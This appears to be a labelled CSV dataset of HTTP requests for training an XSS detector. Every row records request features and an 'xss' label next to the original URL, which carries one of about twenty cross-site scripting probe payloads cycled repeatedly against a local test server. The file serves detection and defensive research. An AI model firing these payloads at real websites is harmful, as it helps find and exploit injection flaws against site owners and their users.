src_port,dest_port,http_method,http_status,http_resp_len,http_url_len,url_contains_script_tag,url_contains_onerror,url_contains_onload,url_contains_onclick,url_contains_onmouseover,url_contains_onfocus,url_contains_alert,url_contains_javascript,url_contains_eval,url_contains_document,url_contains_cookie,url_contains_iframe,url_contains_svg,url_contains_img,url_contains_object,url_contains_embed,http_method_GET,http_method_POST,http_method_PUT,http_method_DELETE,url_has_query_params,url_query_param_count,url_encoded_chars,url_suspicious_chars,response_2xx,response_3xx,response_4xx,response_5xx,is_malicious,attack_type,timestamp,original_url
57308,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:07.937203+0000,"/?q=""><svg%20onload=alert(1)>"
57318,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:44:09.952566+0000,/?q=</textarea><script>alert(1)</script>
48832,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:11.966732+0000,/?q=<img%20src=1%20onerror=prompt(1)>
48834,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:13.979947+0000,/?q=<marquee%20onstart=confirm(1)>
48850,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:44:15.993249+0000,/?q=<script>/*</script><script>alert(1)</script>
48858,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:44:18.006641+0000,/?q=<script>''-alert(1)//</script>
48862,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:44:20.020118+0000,/?q=<svg><script>alert(1)</script></svg>
60252,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:22.034785+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
60260,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:24.050328+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
60276,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:26.065016+0000,/?q=<object%20data='javascript:alert(1)'>
60280,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:28.079142+0000,/?q=<embed%20src='javascript:alert(1)'>
60288,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:30.093132+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
51784,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:44:32.109497+0000,/?q=<script>alert(1)</script>
51798,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:34.123025+0000,/?q=<img%20src=x%20onerror=alert(1)>
51804,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:36.136545+0000,/?q=<svg%20onload=alert(1)>
51806,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:38.151666+0000,/?q=<iframe%20src='javascript:alert(1)'>
51822,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:40.166863+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
38306,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:42.181780+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
38318,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:44.195949+0000,/?q=<body%20onload=alert(1)>
38332,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:46.209293+0000,/?q=<details%20open%20ontoggle=alert(1)>
38334,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:48.223441+0000,"/?q=""><svg%20onload=alert(1)>"
38336,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:44:50.239182+0000,/?q=</textarea><script>alert(1)</script>
56168,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:52.253988+0000,/?q=<img%20src=1%20onerror=prompt(1)>
56178,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:54.268829+0000,/?q=<marquee%20onstart=confirm(1)>
56182,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:44:56.282867+0000,/?q=<script>/*</script><script>alert(1)</script>
56186,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:44:58.298721+0000,/?q=<script>''-alert(1)//</script>
56200,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:45:00.314812+0000,/?q=<svg><script>alert(1)</script></svg>
39958,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:02.331076+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
39970,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:04.345286+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
39982,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:06.358679+0000,/?q=<object%20data='javascript:alert(1)'>
39990,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:08.372578+0000,/?q=<embed%20src='javascript:alert(1)'>
40000,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:10.386082+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
59490,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:45:12.400845+0000,/?q=<script>alert(1)</script>
59500,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:14.414230+0000,/?q=<img%20src=x%20onerror=alert(1)>
59514,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:16.427851+0000,/?q=<svg%20onload=alert(1)>
59516,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:18.441866+0000,/?q=<iframe%20src='javascript:alert(1)'>
59528,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:20.456247+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
49778,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:22.469788+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
49790,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:24.483709+0000,/?q=<body%20onload=alert(1)>
49796,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:26.497547+0000,/?q=<details%20open%20ontoggle=alert(1)>
49806,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:28.510382+0000,"/?q=""><svg%20onload=alert(1)>"
49820,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:45:30.523531+0000,/?q=</textarea><script>alert(1)</script>
56108,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:32.537957+0000,/?q=<img%20src=1%20onerror=prompt(1)>
56110,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:34.552767+0000,/?q=<marquee%20onstart=confirm(1)>
56114,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:45:36.566440+0000,/?q=<script>/*</script><script>alert(1)</script>
56116,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:45:38.581925+0000,/?q=<script>''-alert(1)//</script>
56118,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:45:40.596209+0000,/?q=<svg><script>alert(1)</script></svg>
55700,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:42.610042+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
55710,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:44.623770+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
55726,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:46.638076+0000,/?q=<object%20data='javascript:alert(1)'>
55732,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:48.652240+0000,/?q=<embed%20src='javascript:alert(1)'>
55740,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:50.667728+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
34924,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:45:52.684347+0000,/?q=<script>alert(1)</script>
34932,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:54.698627+0000,/?q=<img%20src=x%20onerror=alert(1)>
34938,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:56.716498+0000,/?q=<svg%20onload=alert(1)>
34952,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:45:58.731047+0000,/?q=<iframe%20src='javascript:alert(1)'>
34960,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:00.744469+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
53486,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:02.758513+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
53498,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:04.773794+0000,/?q=<body%20onload=alert(1)>
53508,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:06.790097+0000,/?q=<details%20open%20ontoggle=alert(1)>
53520,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:08.804583+0000,"/?q=""><svg%20onload=alert(1)>"
53524,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:46:10.819995+0000,/?q=</textarea><script>alert(1)</script>
54828,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:12.834658+0000,/?q=<img%20src=1%20onerror=prompt(1)>
54840,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:14.849325+0000,/?q=<marquee%20onstart=confirm(1)>
54842,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:46:16.880136+0000,/?q=<script>/*</script><script>alert(1)</script>
54844,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:46:18.898794+0000,/?q=<script>''-alert(1)//</script>
54854,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:46:20.913644+0000,/?q=<svg><script>alert(1)</script></svg>
56732,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:22.929928+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
56746,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:24.945695+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
56756,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:26.959726+0000,/?q=<object%20data='javascript:alert(1)'>
56760,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:28.978024+0000,/?q=<embed%20src='javascript:alert(1)'>
52420,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:30.993956+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
52432,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:46:33.012134+0000,/?q=<script>alert(1)</script>
52448,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:35.027617+0000,/?q=<img%20src=x%20onerror=alert(1)>
52458,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:37.044021+0000,/?q=<svg%20onload=alert(1)>
52468,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:39.058311+0000,/?q=<iframe%20src='javascript:alert(1)'>
45442,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:41.076485+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
45448,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:43.092518+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
45450,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:45.109012+0000,/?q=<body%20onload=alert(1)>
45462,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:47.125012+0000,/?q=<details%20open%20ontoggle=alert(1)>
45472,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:49.142259+0000,"/?q=""><svg%20onload=alert(1)>"
57960,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:46:51.159123+0000,/?q=</textarea><script>alert(1)</script>
57974,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:53.175342+0000,/?q=<img%20src=1%20onerror=prompt(1)>
57990,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:46:55.191183+0000,/?q=<marquee%20onstart=confirm(1)>
57996,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:46:57.206911+0000,/?q=<script>/*</script><script>alert(1)</script>
58000,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:46:59.222279+0000,/?q=<script>''-alert(1)//</script>
44794,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:47:01.238013+0000,/?q=<svg><script>alert(1)</script></svg>
44798,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:03.253520+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
44808,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:05.270374+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
44816,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:07.286873+0000,/?q=<object%20data='javascript:alert(1)'>
44828,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:09.301714+0000,/?q=<embed%20src='javascript:alert(1)'>
48282,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:11.318076+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
48286,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:47:13.334716+0000,/?q=<script>alert(1)</script>
48298,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:15.350182+0000,/?q=<img%20src=x%20onerror=alert(1)>
48314,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:17.365139+0000,/?q=<svg%20onload=alert(1)>
48318,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:19.380711+0000,/?q=<iframe%20src='javascript:alert(1)'>
50680,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:21.395430+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
50682,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:23.410225+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
50694,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:25.424986+0000,/?q=<body%20onload=alert(1)>
50702,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:27.440000+0000,/?q=<details%20open%20ontoggle=alert(1)>
50718,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:29.455913+0000,"/?q=""><svg%20onload=alert(1)>"
51572,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:47:31.470300+0000,/?q=</textarea><script>alert(1)</script>
51584,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:33.484793+0000,/?q=<img%20src=1%20onerror=prompt(1)>
51600,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:35.499371+0000,/?q=<marquee%20onstart=confirm(1)>
51608,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:47:37.514821+0000,/?q=<script>/*</script><script>alert(1)</script>
51620,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:47:39.532144+0000,/?q=<script>''-alert(1)//</script>
41930,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:47:41.548581+0000,/?q=<svg><script>alert(1)</script></svg>
41940,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:43.564798+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
41948,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:45.581135+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
41958,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:47.597649+0000,/?q=<object%20data='javascript:alert(1)'>
41962,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:49.613822+0000,/?q=<embed%20src='javascript:alert(1)'>
50744,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:51.628326+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
50760,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:47:53.644294+0000,/?q=<script>alert(1)</script>
